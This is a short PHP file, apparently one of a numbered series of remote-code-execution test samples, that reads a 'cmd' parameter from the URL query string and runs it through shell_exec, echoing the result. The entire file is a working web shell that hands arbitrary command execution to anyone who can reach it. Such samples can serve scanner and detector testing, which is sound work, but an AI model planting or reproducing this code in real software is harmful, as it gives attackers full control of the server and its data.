<?php
// RCE test variation #424
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>